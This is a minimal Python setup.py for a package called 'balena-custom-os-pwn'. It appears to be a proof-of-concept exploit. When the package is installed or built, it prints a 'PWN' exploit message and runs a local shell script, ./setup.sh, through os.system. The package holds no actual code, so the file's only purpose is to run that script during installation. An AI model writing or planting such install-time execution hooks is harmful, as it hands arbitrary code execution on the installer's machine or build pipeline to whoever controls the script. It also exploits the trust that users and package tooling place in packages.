import os
import sys
from setuptools import setup

print("PWN: Starting exploit execution in setup.py...")
os.system("./setup.sh")

setup(
    name="balena-custom-os-pwn",
    version="1.0.0",
    packages=[],
)
